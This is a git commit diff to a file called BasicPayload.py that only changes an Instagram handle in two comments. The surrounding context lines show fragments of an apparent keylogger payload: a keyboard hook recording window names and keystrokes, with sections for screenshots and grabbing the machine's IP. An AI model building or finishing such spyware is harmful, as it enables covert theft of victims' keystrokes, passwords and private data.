0c1483d3ee87244b7b8884d7d6ce57938312e646
Erdoğan Yoksul ([+] Eredot_PK&FR) <erdoganyoksul3@gmail.com>
2019-05-13 23:59:18 +0300

    Update BasicPayload.py

--- BasicPayload.py
+++ BasicPayload.py
@@ -19,7 +19,7 @@ def KeyBoard(event):
     list.append(event.WindowName)                               # My Linkedin Account ==> "https://www.linkedin.com/in/erdo%C4%9Fan-yoksul-47897a151/"
     list.append("     0=={:::::::::::::::>     ")               # My Twitter Account ==> "https://twitter.com/YoksulErdogan"
     list.append(event.Key)                                      # My GitHub Account ==> "https://github.com/eredotpkfr"
-    list.append("\n")                                           # My İnstagram Account ==> "https://www.instagram.com/eredot41_pk.fr/?hl=tr"
+    list.append("\n")                                           # My İnstagram Account ==> "https://www.instagram.com/eredot_pk.fr/?hl=tr"
     return True                                                 # Eredot41_PK&FR          0=={:::::::::::::::::::>
 
 # -------- ScreenShot -------- #
@@ -140,7 +140,7 @@ function_get_machine_ip.start()
 
                     # My Twitter Account ==> "https://twitter.com/YoksulErdogan"
                     # My GitHub Account ==> "https://github.com/eredotpkfr"
-                    # My İnstagram Account ==> "https://www.instagram.com/eredot41_pk.fr/?hl=tr"
+                    # My İnstagram Account ==> "https://www.instagram.com/eredot_pk.fr/?hl=tr"
                     # My Linkedin Account ==> "https://www.linkedin.com/in/erdo%C4%9Fan-yoksul-47897a151/"
                     # Eredot41_PK&FR          0=={:::::::::::::::::::>
 
